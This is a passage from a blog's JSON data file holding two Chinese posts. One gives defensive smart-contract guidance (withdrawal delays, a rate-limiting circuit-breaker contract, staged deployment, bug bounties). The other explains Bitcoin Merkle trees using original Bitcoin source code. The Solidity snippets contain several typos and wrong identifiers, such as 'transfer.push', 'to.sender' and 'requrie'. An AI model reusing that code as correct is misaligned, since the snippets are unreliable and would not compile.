class=\"line\">\t &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">function withdraw() public &#123;</span><br><span class=\"line\">\tif(requestedWithdrawals[msg.sender].amount &gt; 0 &amp;&amp; now &gt; requestedWithdrawals[msg.sender].time + withdrawalWaitPeriod) &#123;</span><br><span class=\"line\">\t\tuint amountToWithdraw = requestedWithdrawals[msg.sender].amount;</span><br><span class=\"line\">\t\trequestedWithdrawals[msg.sender].amount = 0;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\trequire(msg.sender.send(amountToWithdraw));</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"比例限制\"><a href=\"#比例限制\" class=\"headerlink\" title=\"比例限制\"></a>比例限制</h3><p>比例限制停止或要求实质性变更的通过。举例来说，一个存款人在一定时期内只允许提取一定数量或一定百分比的存款（如 一天最多 100 ether）- 另外在该时期内的提币将会失败或者需要一些特殊的审批通过。或者比例限制可以通过在该时期内合约只能提取一定的 token 的形式在合约层面实现。</p>\n<p>例子：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">contract CircuitBreaker &#123;</span><br><span class=\"line\">\tstruct Transfer &#123;</span><br><span class=\"line\">\t\tuint amount;</span><br><span class=\"line\">\t\taddress to;</span><br><span class=\"line\">\t\tuint releaseBlock;</span><br><span class=\"line\">\t\tbool released;</span><br><span class=\"line\">\t\tbool stopped;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tTransfer[] public transfers;</span><br><span class=\"line\"></span><br><span class=\"line\">\taddress public curator;</span><br><span class=\"line\">\taddress public authorizedSender;</span><br><span class=\"line\">\tuint public period;</span><br><span class=\"line\">\tuint public limit;</span><br><span class=\"line\"></span><br><span class=\"line\">\tuint public currentPeriodEnd;</span><br><span class=\"line\">\tuint public currentPeriodAmount;</span><br><span class=\"line\"></span><br><span class=\"line\">\tevent PendingTransfer(uint id, uint amount, address to, uint releaseBlock);</span><br><span class=\"line\"></span><br><span class=\"line\">\tfunction CircuitBreaker(address _curator, address _authorizedSender, uint _period, uint _limit) &#123;</span><br><span class=\"line\">\t\tcurator = _curator;</span><br><span class=\"line\">\t\tperiod = _period;</span><br><span class=\"line\">\t\tlimit = _limit;</span><br><span class=\"line\">\t\tauthorizedSender = _authorizedSender;</span><br><span class=\"line\">\t\tcurrentPeriodEnd = block.number + period;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tfunction transfer(uint amount, address to) &#123;</span><br><span class=\"line\">\t\tif (msg.sender == authorizedSender) &#123;</span><br><span class=\"line\">\t\t\tupdatePeriod();</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t\tif (currentPeriodAmount + amount &gt; limit) &#123;</span><br><span class=\"line\">\t\t\t\tuint releaseBlock = block.number + period;</span><br><span class=\"line\">\t\t\t\tPendingTransfer(transfer.length, amount, to, releaseBlock);</span><br><span class=\"line\">\t\t\t\ttransfer.push(Transfer(amount, to, releaseBlock, false, false));</span><br><span class=\"line\">\t\t\t&#125; else &#123;</span><br><span class=\"line\">\t\t\t\tcurrentPeriodAmount += amount;</span><br><span class=\"line\">\t\t\t\ttransfers.push(Transfer(amount, to, block.number, true, false));</span><br><span class=\"line\">\t\t\t\tif (!to.sender(amount)) throw;</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tfunction updatePeriod() &#123;</span><br><span class=\"line\">\t\tif (currentPeriodEnd &lt; block.number) &#123;</span><br><span class=\"line\">\t\t\tcurrentPeriodEnd = block.number + period;</span><br><span class=\"line\">\t\t\tcurrentPeriodAmount = 0;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tfunction releasePendingTransfer(uint id) &#123;</span><br><span class=\"line\">\t\tTransfer transfer = transfers[id];</span><br><span class=\"line\">\t\tif (transfer.releaseBlock &lt;= block.number &amp;&amp; !transfer.released &amp;&amp; !transfer.stopped) &#123;</span><br><span class=\"line\">\t\t\ttransfer.released = true;</span><br><span class=\"line\">\t\t\tif (!transfer.to.send(transfer.amount)) throw;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tfunction stopTransfer(uint id) &#123;</span><br><span class=\"line\">\t\tif (msg.sender == curator) &#123;</span><br><span class=\"line\">\t\t\ttransfer[id].stopped = true;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"合约部署\"><a href=\"#合约部署\" class=\"headerlink\" title=\"合约部署\"></a>合约部署</h3><p>在资金处于危险之前，合约应该有大量的长期的测试阶段。</p>\n<p>最小程度，你应该：</p>\n<ul>\n<li>有一个完整的测试套件，覆盖了 100%（或者接近） 的测试。</li>\n<li>部署在你自己的测试网络上。</li>\n<li>经过大量的测试之后才能发布在公共测试网络上，并且要发布 bug 悬赏。</li>\n<li>详尽的测试应该包括大量不同的玩家同时与合约交互。</li>\n<li>将 beta 版本部署在主网上，降低风险。</li>\n</ul>\n<h5 id=\"自动防护\"><a href=\"#自动防护\" class=\"headerlink\" title=\"自动防护\"></a>自动防护</h5><p>在测试期，你可以设置在一定时期之后自动反对来防止任何的操作。举例来说，一个 alpha 版本的合约在工作几周之后会自动关闭所有的操作，除了最终的提币。<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">modifier isActive() &#123;</span><br><span class=\"line\">\trequrie(block.number &lt;= SOME_BLOCK_NUMBER);</span><br><span class=\"line\">\t_;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">function deposit() public isActive &#123;</span><br><span class=\"line\">\t// some code</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">function withdraw() public &#123;</span><br><span class=\"line\">\t// some code</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<h5 id=\"限制每个用户-合约的-ETH-数量\"><a href=\"#限制每个用户-合约的-ETH-数量\" class=\"headerlink\" title=\"限制每个用户/合约的 ETH 数量\"></a>限制每个用户/合约的 ETH 数量</h5><p>在早期阶段，你可以限制任何用户（或者整个合约）的 ETH 数量来降低风险。</p>\n<h3 id=\"bug-悬赏计划\"><a href=\"#bug-悬赏计划\" class=\"headerlink\" title=\"bug 悬赏计划\"></a>bug 悬赏计划</h3><p>一些悬赏计划的技巧：</p>\n<ul>\n<li>决定奖励哪些货币（BTC 或者 ETH）</li>\n<li>决定悬赏的总预算</li>\n<li>从预算中确定三层奖励：</li>\n<li>你愿意付出的最小奖励</li>\n<li>最高的奖励是可以常常被获得的</li>\n<li>如果存在非常严重的漏洞，将额外给予的奖励范围</li>\n<li>确定赏金评委是谁（3人可能是典型的理想人选）</li>\n<li>首席开发者可能应该是赏金评委之一</li>\n<li>当收到错误报告时，首席开发人员应该根据评委的建议评估错误的严重程度</li>\n<li>在这个阶段的工作应该是在一个私有仓库，并归档在 Github 上提出的问题</li>\n<li>如果这是一个应该修复的 bug，那么在私有仓库中，开发人员应该编写一个测试用例，这个用例应该会失败，从而确认 bug</li>\n<li>开发人员应该执行修复程序并确保测试通过; 根据需要编写额外的测试</li>\n<li>给赏金猎人展示修复工作; 将修复合并入公共仓库是一种方法</li>\n<li>确定赏金猎人是否有任何其他有关修复的反馈</li>\n<li>赏金评委根据他们对 bug 的 <em>可能性</em> 和 <em>影响</em> 的评估来确定奖励的大小</li>\n<li>在整个过程中保持奖励参与者的信息，然后努力避免延误向他们发送奖励</li>\n</ul>\n<p>有关三种奖励的例子，请参阅<a href=\"https://bounty.ethereum.org/\" target=\"_blank\" rel=\"noopener\">以太坊的赏金计划</a>：</p>\n<blockquote>\n<p>支付的奖励价值取决于影响的严重程度。 对轻微“无害”错误的奖励最少 0.05 BTC。例如，导致共识问题的错误将奖励高达 5 BTC。 如果存在非常严重的漏洞，可能获得更高的奖励（高达 25 BTC）。</p>\n</blockquote>\n"},{"title":"比特币挖矿之Merkle树","comments":0,"date":"2018-03-02T08:08:16.000Z","img":null,"_content":"\n## Merkle树概念\nMerkle树，通常也被称为Hash Tree，顾名思义，就是存储hash值的一棵树。Merkle树的叶子是数据块的Hash值，非叶子节点是其对应子节点串联字符串的Hash值。\n在最底层，和哈希列表一样，我们把数据分成小的数据块，有相应的哈希与之对应。但是往上走，并不是直接去运算根哈希，而是把相邻的两个哈希合成一个字符串，然后运算这个字符串的哈希。如果最底层的哈希总数是单数，那么便将最后一个叶子节点复制一份，以构成偶数个叶子节点，这种偶数个叶子节点的树也被称为平衡树。\n\n## Merkle树特点\n1、Merkle树是一种树，大多数是二叉树，也可以是多叉树，当然也都具有树结构的所有特点；\n2、Merkle树的叶子节点的值是数据集合的单元数据或者单元数据的HASH。\n3、非叶子节点的值是根据它下面所有的叶子节点值，按照Hash算法计算得到的。\n\n## 比特币与Merkle树\n根据之前文章对比特币区块头的分析，可以知道比特币区块头中存在一个hashMerkleRoot字段，这儿的hashMerkleRoot便是区块中所有交易构建的Merkle树的树根value，比特币使用Merkle树来归纳一个区块中的所有交易，当某个节点试图修改某个区块中的交易时，交易的Hash值改变，这种改变层层传递，会导致MerkleRoot值改变，进而导致区块头的Hash值改变，这将导致软分叉，要想使这种改变被全网接受，只能通过大算力，使包含该区块的链成为最长链，这种修改的成本无疑是巨大的。由于Merkle树结构的特殊性，通过Merkle树，轻量级节点SPV可以很容易验证交易的存在，下面进行具体介绍。\n![](/images/miner.png)\nSPV节点不保存所有交易，也不会下载整个区块，仅保存区块头，当需要验证交易时，假设要验证区块图中交易tx3,SPV节点会通过向相邻节点索要Merkle树分支（H4->H12->H5656->root）来确认交易的存在性和正确性。得到了分支数据，SPV节点可以很容易计算出H34->H1234->root,通过这种计算得到的root与本地存储的区块头中的hashMerkleRoot字段比较，可以很容易得到验证结果。\n\n比特币[最初版本](https://github.com/trottier/original-bitcoin/blob/92ee8d9a994391d148733da77e2bbc2f4acc43cd/src/main.h#L868)构建Merkle树的实现代码如下：\n```\nuint256 BuildMerkleTree() const\n{\n    vMerkleTree.clear(); // 清空Merkle树原有内容 vMerkleTree是一个vector<uint256> 结构\n    foreach(const CTransaction& tx, vtx) // 遍历所有交易 vtx是一个vector<CTransaction> 结构 \n\t\tvMerkleTree.push_back(tx.GetHash());  // 将交易Hash放入Merkle树，作为叶子节点 \n\tint j = 0;\n    // 构建Merkle树的非叶节点\n    for (int nSize = vtx.size(); nSize > 1; nSize = (nSize + 1) / 2)\n     {\n\t\t  for (int i = 0; i < nSize; i += 2)\n\t\t  {\n\t\t\t  int i2 = min(i+1, nSize-1);\n              vMerkleTree.push_back(Hash(BEGIN(vMerkleTree[j+i]),  END(vMerkleTree[j+i]),\n\t\t\t  BEGIN(vMerkleTree[j+i2]), END(vMerkleTree[j+i2])));\n\t\t  }\n\t\t  j += nSize;\n\t }\n\t// 返回vMerkleTree的最后一个元素，即为MerkleRoot\n\treturn (vMerkleTree.empty() ? 0 : vMerkleTree.back());\n}\n```\n获取[Merkle树分支](https://github.com/trottier/original-bitcoin/blob/92ee8d9a994391d148733da77e2bbc2f4acc43cd/src/main.h#L887)的代码如下：\n```\nvector<uint256> GetMerkleBranch(int nIndex) const\n{\n\t    // 判断MerkleTree是否为空，若为空，则重新构建\n\tif (vMerkleTree.empty())\n\t  BuildMerkleTree();\n\t// vMerkleBranch用来保存分支数据\n\tvector<uint256> vMerkleBranch;\n\tint j = 0;\n\t// 填充分支数据\n\tfor (int nSize = vtx.size(); nSize > 1; nSize = (nSize + 1) / 2)\n\t{\n\t\tint i = min(nIndex^1, nSize-1);\n\t\tvMerkleBranch.push_back(vMerkleTree[j+i]);\n\t\tnIndex >>= 1;\n\t\tj += nSize;\n\t}\n\treturn vMerkleBranch;\n}\n```\n","source":"_posts/比特币挖矿之Merkle树.md","raw":"---\ntitle: 比特币挖矿之Merkle树\ncomments: false\ndate: 2018-03-02 16:08:16\ncategories: 矿池 \ntags: \n- LeonBCK \n- 比特币 \n- 矿池\nimg:\n---\n\n## Merkle树概念\nMerkle树，通常也被称为Hash Tree，顾名思义，就是存储hash值的一棵树。Merkle树的叶子是数据块的Hash值，非叶子节点是其对应子节点串联字符串的Hash值。\n在最底层，和哈希列表一样，我们把数据分成小的数据块，有相应的哈希与之对应。但是往上走，并不是直接去运算根哈希，而是把相邻的两个哈希合成一个字符串，然后运算这个字符串的哈希。如果最底层的哈希总数是单数，那么便将最后一个叶子节点复制一份，以构成偶数个叶子节点，这种偶数个叶子节点的树也被称为平衡树。\n\n## Merkle树特点\n1、Merkle树是一种树，大多数是二叉树，也可以是多叉树，当然也都具有树结构的所有特点；\n2、Merkle树的叶子节点的值是数据集合的单元数据或者单元数据的HASH。\n3、非叶子节点的值是根据它下面所有的叶子节点值，按照Hash算法计算得到的。\n\n## 比特币与Merkle树\n根据之前文章对比特币区块头的分析，可以知道比特币区块头中存在一个hashMerkleRoot字段，这儿的hashMerkleRoot便是区块中所有交易构建的Merkle树的树根value，比特币使用Merkle树来归纳一个区块中的所有交易，当某个节点试图修改某个区块中的交易时，交易的Hash值改变，这种改变层层传递，会导致MerkleRoot值改变，进而导致区块头的Hash值改变，这将导致软分叉，要想使这种改变被全网接受，只能通过大算力，使包含该区块的链成为最长链，这种修改的成本无疑是巨大的。由于Merkle树结构的特殊性，通过Merkle树，轻量级节点SPV可以很容易验证交易的存在，下面进行具体介绍。\n![](/images/miner.png)\nSPV节点不保存所有交易，也不会下载整个区块，仅保存区块头，当需要验证交易时，假设要验证区块图中交易tx3,SPV节点会通过向相邻节点索要Merkle树分支（H4->H12->H5656->root）来确认交易的存在性和正确性。得到了分支数据，SPV节点可以很容易计算出H34->H1234->root,通过这种计算得到的root与本地存储的区块头中的hashMerkleRoot字段比较，可以很容易得到验证结果。\n\n比特币[最初版本](https://github.com/trottier/original-bitcoin/blob/92ee8d9a994391d148733da77e2bbc2f4acc43cd/src/main.h#L868)构建Merkle树的实现代码如下：\n```\nuint256 BuildMerkleTree() const\n{\n    vMerkleTree.clear(); // 清空Merkle树原有内容 vMerkleTree是一个vector<uint256> 结构\n    foreach(const CTransaction& tx, vtx) // 遍历所有交易 vtx是一个vector<CTransaction> 结构 \n\t\tvMerkleTree.push_back(tx.GetHash());  // 将交易Hash放入Merkle树，作为叶子节点 \n\tint j = 0;\n    // 构建Merkle树的非叶节点\n    for (int nSize = vtx.size(); nSize > 1; nSize = (nSize + 1) / 2)\n     {\n\t\t  for (int i = 0; i < nSize; i += 2)\n\t\t  {\n\t\t\t  int i2 = min(i+1, nSize-1);\n              vMerkleTree.push_back(Hash(BEGIN(vMerkleTree[j+i]),  END(vMerkleTree[j+i]),\n\t\t\t  BEGIN(vMerkleTree[j+i2]), END(vMerkleTree[j+i2])));\n\t\t  }\n\t\t  j += nSize;\n\t }\n\t// 返回vMerkleTree的最后一个元素，即为MerkleRoot\n\treturn (vMerkleTree.empty() ? 0 : vMerkleTree.back());\n}\n```\n获取[Merkle树分支](https://github.com/trottier/original-bitcoin/blob/92ee8d9a994391d148733da77e2bbc2f4acc43cd/src/main.h#L887)的代码如下：\n```\nvector<uint256> GetMerkleBranch(int nIndex) const\n{\n\t    // 判断MerkleTree是否为空，若为空，则重新构建\n\tif (vMerkleTree.empty())\n\t  BuildMerkleTree();\n\t// vMerkleBranch用来保存分支数据\n\tvector<uint256> vMerkleBranch;\n\tint j = 0;\n\t// 填充分支数据\n\tfor (int nSize = vtx.size(); nSize > 1; nSize = (nSize + 1) / 2)\n\t{\n\t\tint i = min(nIndex^1, nSize-1);\n\t\tvMerkleBranch.push_back(vMerkleTree[j+i]);\n\t\tnIndex >>= 1;\n\t\tj += nSize;\n\t}\n\treturn vMerkleBranch;\n}\n```\n","slug":"比特币挖矿之Merkle树","published":1,"updated":"2018-03-09T09:32:59.585Z","layout":"post","photos":[],"link":"","_id":"cjf7piavz001kpkwom15ghi37","content":"<h2 id=\"Merkle树概念\"><a href=\"#Merkle树概念\" class=\"headerlink\" title=\"Merkle树概念\"></a>Merkle树概念</h2><p>Merkle树，通常也被称为Hash Tree，顾名思义，就是存储hash值的一棵树。Merkle树的叶子是数据块的Hash值，非叶子节点是其对应子节点串联字符串的Hash值。<br>在最底层，和哈希列表一样，我们把数据分成小的数据块，有相应的哈希与之对应。但是往上走，并不是直接去运算根哈希，而是把相邻的两个哈希合成一个字符串，然后运算这个字符串的哈希。如果最底层的哈希总数是单数，那么便将最后一个叶子节点复制一份，以构成偶数个叶子节点，这种偶数个叶子节点的树也被称为平衡树。</p>\n<h2 id=\"Merkle树特点\"><a href=\"#Merkle树特点\" class=\"headerlink\" title=\"Merkle树特点\"></a>Merkle树特点</h2><p>1、Merkle树是一种树，大多数是二叉树，也可以是多叉树，当然也都具有树结构的所有特点；<br>2、Merkle树的叶子节点的值是数据集合的单元数据或者单元数据的HASH。<br>3、非叶子节点的值是根据它下面所有的叶子节点值，按照Hash算法计算得到的。</p>\n<h2 id=\"比特币与Merkle树\"><a href=\"#比特币与Merkle树\" class=\"headerlink\" title=\"比特币与Merkle树\"></a>比特币与Merkle树</h2><p>根据之前文章对比特币区块头的分析，可以知道比特币区块头中存在一个hashMerkleRoot字段，这儿的hashMerkleRoot便是区块中所有交易构建的Merkle树的树根value，比特币使用Merkle树来归纳一个区块中的所有交易，当某个节点试图修改某个区块中的交易时，交易的Hash值改变，这种改变层层传递，会导致MerkleRoot值改变，进而导致区块头的Hash值改变，这将导致软分叉，要想使这种改变被全网接受，只能通过大算力，使包含该区块的链成为最长链，这种修改的成本无疑是巨大的。由于Merkle树结构的特殊性，通过Merkle树，轻量级节点SPV可以很容易验证交易的存在，下面进行具体介绍。<br><img src=\"/images/miner.png\" alt=\"\"><br>SPV节点不保存所有交易，也不会下载整个区块，仅保存区块头，当需要验证交易时，假设要验证区块图中交易tx3,SPV节点会通过向相邻节点索要Merkle树分支（H4-&gt;H12-&gt;H5656-&gt;root）来确认交易的存在性和正确性。得到了分支数据，SPV节点可以很容易计算出H34-&gt;H1234-&gt;root,通过这种计算得到的root与本地存储的区块头中的hashMerkleRoot字段比较，可以很容易得到验证结果。</p>\n<p>比特币<a href=\"https://github.com/trottier/original-bitcoin/blob/92ee8d9a994391d148733da77e2bbc2f4acc43cd/src/main.h#L868\" target=\"_blank\" rel=\"noopener\">最初版本</a>构建Merkle树的实现代码如下：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">uint256 BuildMerkleTree() const</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    vMerkleTree.clear(); // 清空Merkle树原有内容 vMerkleTree是一个vector&lt;uint256&gt; 结构</span><br><span class=\"line\">    foreach(const CTransaction&amp; tx, vtx) // 遍历所有交易 vtx是一个vector&lt;CTransaction&gt; 结构 </span><br><span class=\"line\">\t\tvMerkleTree.push_back(tx.GetHash());  // 将交易Hash放入Merkle树，作为叶子节点 </span><br><span class=\"line\">\tint j = 0;</span><br><span class=\"line\">    // 构建Merkle树的非叶节点</span><br><span class=\"line\">    for (int nSize = vtx.size(); nSize &gt; 1; nSize = (nSize + 1) / 2)</span><br><span class=\"line\">     &#123;</span><br><span class=\"line\">\t\t  for (int i = 0; i &lt; nSize; i += 2)</span><br><span class=\"line\">\t\t  &#123;</span><br><span class=\"line\">\t\t\t  int i2 = min(i+1, nSize-1);</span><br><span class=\"line\">              vMerkleTree.push_back(Hash(BEGIN(vMerkleTree[j+i]),  END(vMerkleTree[j+i]),</span><br><span class=\"line\">\t\t\t  BEGIN(vMerkleTree[j+i2]), END(vMerkleTree[j+i2])));</span><br><span class=\"line\">\t\t  &#125;</span><br><span class=\"line\">\t\t  j += nSize;</span><br><span class=\"line\">\t &#125;</span><br><span class=\"line\">\t// 返回vMerkleTree的最后一个元素，即为MerkleRoot</span><br><span class=\"line\">\treturn (vMerkleTree.empty() ? 0 : vMerkleTree.back());</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>获取<a href=\"https://github.com/trottier/original-bitcoin/blob/92ee8d9a994391d148733da77e2bbc2f4acc43cd/src/main.h#L887\" target=\"_blank\" rel=\"noopener\">Merkle树分支</a>的代码如下：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">vector&lt;uint256&gt; GetMerkleBranch(int nIndex) const</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t    // 判断MerkleTree是否为空，若为空，则重新构建</span><br><span class=\"line\">\tif (vMerkleTree.empty())</span><br><span class=\"line\">\t  BuildMerkleTree();</span><br><span class=\"line\">\t// vMerkleBranch用来保存分支数据</span><br><span class=\"line\">\tvector&lt;uint256&gt; vMerkleBranch;</span><br><span class=\"line\">\tint j = 0;</span><br><span class=\"line\">\t// 填充分支数据</span><br><span class=\"line\">\tfor (int nSize = vtx.size(); nSize &gt; 1; nSize = (nSize + 1) / 2)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tint i = min(nIndex^1, nSize-1);</span><br><span class=\"line\">\t\tvMerkleBranch.push_back(vMerkleTree[j+i]);</span><br><span class=\"line\">\t\tnIndex &gt;&gt;= 1;</span><br><span class=\"line\">\t\tj += nSize;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\treturn vMerkleBranch;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"Merkle树概念\"><a href=\"#Merkle树概念\" class=\"headerlink\" title=\"Merkle树概念\"></a>Merkle树概念</h2><p>Merkle树，通常也被称为Hash Tree，顾名思义，就是存储hash值的一棵树。Merkle树的叶子是数据块的Hash值，非叶子节点是其对应子节点串联字符串的Hash值。<br>在最底层，和哈希列表一样，我们把数据分成小的数据块，有相应的哈希与之对应。但是往上走，并不是直接去运算根哈希，而是把相邻的两个哈希合成一个字符串，然后运算这个字符串的哈希。如果最底层的哈希总数是单数，那么便将最后一个叶子节点复制一份，以构成偶数个叶子节点，这种偶数个叶子节点的树也被称为平衡树。</p>\n<h2 id=\"Merkle树特点\"><a href=\"#Merkle树特点\" class=\"headerlink\" title=\"Merkle树特点\"></a>Merkle树特点</h2><p>1、Merkle树是一种树，大多数是二叉树，也可以是多叉树，当然也都具有树结构的所有特点；<br>2、Merkle树的叶子节点的值是数据集合的单元数据或者单元数据的HASH。<br>3、非叶子节点的值是根据它下面所有的叶子节点值，按照Hash算法计算得到的。</p>\n<h2 id=\"比特币与Merkle树\"><a href=\"#比特币与Merkle树\" class=\"headerlink\" title=\"比特币与Merkle树\"></a>比特币与Merkle树</h2><p>根据之前文章对比特币区块头的分析，可以知道比特币区块头中存在一个hashMerkleRoot字段，这儿的hashMerkleRoot便是区块中所有交易构建的Merkle树的树根value，比特币使用Merkle树来归纳一个区块中的所有交易，当某个节点试图修改某个区块中的交易时，交易的Hash值改变，这种改变层层传递，会导致MerkleRoot值改变，进而导致区块头的Hash值改变，这将导致软分叉，要想使这种改变被全网接受，只能通过大算力，使包含该区块的链成为最长链，这种修改的成本无疑是巨大的。由于Merkle树结构的特殊性，通过Merkle树，轻量级节点SPV可以很容易验证交易的存在，下面进行具体介绍。<br><img src=\"/images/miner.png\" alt=\"\"><br>SPV节点不保存所有交易，也不会下载整个区块，仅保存区块头，当需要验证交易时，假设要验证区块图中交易tx3,SPV节点会通过向相邻节点索要Merkle树分支（H4-&gt;H12-&gt;H5656-&gt;root）来确认交易的存在性和正确性。得到了分支数据，SPV节点可以很容易计算出H34-&gt;H1234-&gt;root,通过这种计算得到的root与本地存储的区块头中的hashMerkleRoot字段比较，可以很容易得到验证结果。</p>\n<p>比特币<a href=\"https://github.com/trottier/original-bitcoin/blob/92ee8d9a994391d148733da77e2bbc2f4acc43cd/src/main.h#L868\" target=\"_blank\" rel=\"noopener\">最初版本</a>构建Merkle树的实现代码如下：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">uint256 BuildMerkleTree() const</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    vMerkleTree.clear(); // 清空Merkle树原有内容 vMerkleTree是一个vector&lt;uint256&gt; 结构</span><br><span class=\"line\">    foreach(const CTransaction&amp; tx, vtx) // 遍历所有交易 vtx是一个vector&lt;CTransaction&gt; 结构 </span><br><span class=\"line\">\t\tvMerkleTree.push_back(tx.GetHash());  // 将交易Hash放入Merkle树，作为叶子节点 </span><br><span class=\"line\">\tint j = 0;</span><br><span class=\"line\">    // 构建Merkle树的非叶节点</span><br><span class=\"line\">    for (int nSize = vtx.size(); nSize &gt; 1; nSize = (nSize + 1) / 2)</span><br><span class=\"line\">     &#123;</span><br><span class=\"line\">\t\t  for (int i = 0; i &lt; nSize; i += 2)</span><br><span class=\"line\">\t\t  &#123;</span><br><span class=\"line\">\t\t\t  int i2 = min(i+1, nSize-1);</span><br><span class=\"line\">              vMerkleTree.push_back(Hash(BEGIN(vMerkleTree[j+i]),  END(vMerkleTree[j+i]),</span><br><span class=\"line\">\t\t\t  BEGIN(vMerkleTree[j+i2]), END(vMerkleTree[j+i2])));</span><br><span class=\"line\">\t\t  &#125;</span><br><span class=\"line\">\t\t  j += nSize;</span><br><span class=\"line\">\t &#125;</span><br><span class=\"line\">\t// 返回vMerkleTree的最后一个元素，即为MerkleRoot</span><br><span class=\"line\">\treturn (vMerkleTree.empty() ? 0 : vMerkleTree.back());</span><br><span 